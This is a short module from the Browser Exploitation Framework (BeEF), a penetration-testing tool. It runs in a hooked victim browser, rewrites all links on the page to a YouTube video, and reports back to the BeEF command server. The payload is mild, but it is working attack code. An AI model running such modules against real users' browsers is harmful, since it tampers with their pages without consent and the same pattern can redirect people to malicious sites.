//
// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteLinks('https://www.youtube.com/watch?v=dQw4w9WgXcQ')+' links rewritten to https://www.youtube.com/watch?v=dQw4w9WgXcQ');
});

